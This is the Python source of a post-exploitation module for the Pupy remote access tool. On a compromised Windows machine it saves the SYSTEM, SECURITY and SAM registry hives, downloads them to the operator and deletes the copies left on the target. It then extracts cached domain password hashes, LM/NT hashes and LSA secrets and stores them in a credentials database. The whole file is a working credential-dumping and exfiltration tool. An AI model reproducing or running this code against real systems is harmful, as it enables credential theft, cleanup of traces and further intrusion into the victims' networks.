# -*- coding: UTF8 -*-

# Author: DeveloppSoft - developpsoft.github.io

# Changelogs:
# 26 May 2016
#  init (not working, 'System' process block the download of the hives...
#
# 28 May 2016
#  save the hives with 'reg save' before downloading

# TODO
# saves the hives with a random name
# do not write the saves on the target

from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from pupylib.utils.credentials import Credentials
from modules.lib.utils.shell_exec import shell_exec

from rpyc.utils.classic import download

import os
import os.path
import ntpath

# CredDump imports
from modules.lib.windows.creddump.win32.domcachedump import dump_hashes
from modules.lib.windows.creddump.addrspace import HiveFileAddressSpace
from modules.lib.windows.creddump.win32.hashdump import get_bootkey, get_hbootkey
from modules.lib.windows.creddump.win32.hashdump import get_user_hashes, get_user_keys, get_user_name
from modules.lib.windows.creddump.win32.hashdump import empty_lm, empty_nt
from modules.lib.windows.creddump.win32.lsasecrets import get_file_secrets

__class_name__="CredDump"

@config(cat="creds", compatibilities=["windows"], tags=['creds',
    'credentials', 'password', 'gather', 'hives'])
class CredDump(PupyModule):
    
    """ download the hives from a remote windows system and dump creds """
    
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='hive', description=self.__doc__)
    
    def run(self, args):
        # First, we download the hives...
        rep=os.path.join("data","downloads",self.client.short_name(),"hives")
        try:
            os.makedirs(rep)
        except Exception:
            pass
        
        self.success("saving SYSTEM hives in %TEMP%...")
        for cmd in ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM /y", "reg save HKLM\\SECURITY %TEMP%/SECURITY /y", "reg save HKLM\\SAM %TEMP%/SAM /y"):
            self.info("running %s..." % cmd)
            self.log(shell_exec(self.client, cmd))
        self.success("hives saved!")
        remote_temp=self.client.conn.modules['os.path'].expandvars("%TEMP%")
        
        self.info("downloading SYSTEM hive...")
        download(self.client.conn, ntpath.join(remote_temp, "SYSTEM"), os.path.join(rep, "SYSTEM"))
        
        self.info("downloading SECURITY hive...")
        download(self.client.conn, ntpath.join(remote_temp, "SECURITY"), os.path.join(rep, "SECURITY"))
        
        self.info("downloading SAM hive...")
        download(self.client.conn, ntpath.join(remote_temp, "SAM"), os.path.join(rep, "SAM"))
        
        self.success("hives downloaded to %s" % rep)
        
        # Cleanup
        self.success("cleaning up saves...")
        try:
            self.client.conn.modules.os.remove(ntpath.join(remote_temp, "SYSTEM"))
            self.client.conn.modules.os.remove(ntpath.join(remote_temp, "SECURITY"))
            self.client.conn.modules.os.remove(ntpath.join(remote_temp, "SAM"))
            self.success("saves deleted")
        except Exception as e:
            self.warning("error deleting temporary files: %s"%str(e))
        
        # Time to run creddump!
        # HiveFileAddressSpace - Volatilty
        sysaddr = HiveFileAddressSpace(os.path.join(rep, "SYSTEM"))
        secaddr = HiveFileAddressSpace(os.path.join(rep, "SECURITY"))
        samaddr = HiveFileAddressSpace(os.path.join(rep, "SAM"))
    
        #detect windows version
        is_vista=False
        try:
            if self.client.conn.modules['sys'].getwindowsversion()[0] >=6:
                is_vista=True
                self.info("windows > vista detected")
            else:
                self.info("windows < vista detected")
        except:
            self.warning("windows version couldn't be determined. supposing vista=False")


        # Print the results
        self.success("dumping cached domain passwords...")

        for (u, d, dn, h) in dump_hashes(sysaddr, secaddr, is_vista):
            self.success("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
                d.lower(), dn.lower()))
        
        self.success("dumping LM and NT hashes...")
        bootkey = get_bootkey(sysaddr)
        hbootkey = get_hbootkey(samaddr,bootkey)
        hashes = []
        for user in get_user_keys(samaddr):
            lmhash, nthash = get_user_hashes(user,hbootkey)
            if not lmhash: lmhash = empty_lm
            if not nthash: nthash = empty_nt
            self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
            hashes.append({'hashes': "%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')), 'Tool': 'Creddump'})
        
        db = Credentials()
        db.add(hashes)
        self.success("Hashes stored on the database")
        
        self.success("dumping lsa secrets...")
        secrets = get_file_secrets(os.path.join(rep, "SYSTEM"), os.path.join(rep, "SECURITY"), is_vista)
        if not secrets:
            self.error("unable to read LSA secrets, perhaps the hives are corrupted")
            return
        for key in secrets:
            self.log(key)
            self.log(self.dump(secrets[key], length=16))
        
        # The End! (hurrah)
        self.success("dump was successfull!")
        
    def dump(self, src, length=8):
        FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
        N=0; result=''
        while src:
           s,src = src[:length],src[length:]
           hexa = ' '.join(["%02X"%ord(x) for x in s])
           s = s.translate(FILTER)
           result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
           N+=length
        return result
